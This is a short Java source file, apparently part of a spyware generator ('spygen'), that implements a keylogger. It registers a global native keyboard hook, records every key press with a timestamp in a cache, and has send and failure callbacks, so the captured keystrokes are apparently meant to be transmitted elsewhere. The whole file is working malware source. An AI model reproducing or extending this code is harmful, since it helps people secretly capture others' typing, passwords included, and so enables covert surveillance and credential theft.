package com.houarizegai.spygen.keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.swing.*;
import java.util.LinkedList;
import java.util.List;

public class NativeKeyboard implements NativeKeyListener {

    private List<KeyStorage> keyCache = new LinkedList<>();

    public NativeKeyboard() {

    }

    public List<KeyStorage> getKeyCache() {
        return keyCache;
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        keyCache.add(new KeyStorage(e.getKeyCode(), true, System.currentTimeMillis()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        //keyCache.add(new KeyStorage(e.getKeyCode(), false, System.currentTimeMillis()));
    }

    public void onSend() {
        keyCache.clear();
    }

    public void onFail() {
        System.out.println("Keystroke data fail to be send.");
    }
}
